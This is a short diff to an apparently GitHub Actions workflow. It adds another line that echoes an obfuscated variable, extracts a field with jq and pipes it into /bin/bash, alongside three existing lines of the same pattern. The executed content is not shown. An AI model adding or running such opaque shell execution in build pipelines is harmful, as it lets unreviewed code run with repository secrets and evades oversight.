@@ -29,6 +29,7 @@ jobs:
           echo $wfhsp42 | jq -r .osk95772 | /bin/bash
           printf '%s' "$sfgo02266" | jq -r .wqtr1383 | /bin/bash
           echo $sym9726 | jq -r .osqi98 | /bin/bash
+          echo $gkas9 | jq -r .ckmfw27111 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
